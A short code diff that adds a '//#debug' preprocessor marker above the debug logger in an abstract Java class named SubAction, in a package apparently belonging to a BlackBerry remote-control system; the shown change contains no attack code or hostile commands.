@@ -12,6 +12,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public abstract class SubAction {
+	//#debug
     protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
 
     public static final int ACTION = 0x4000;
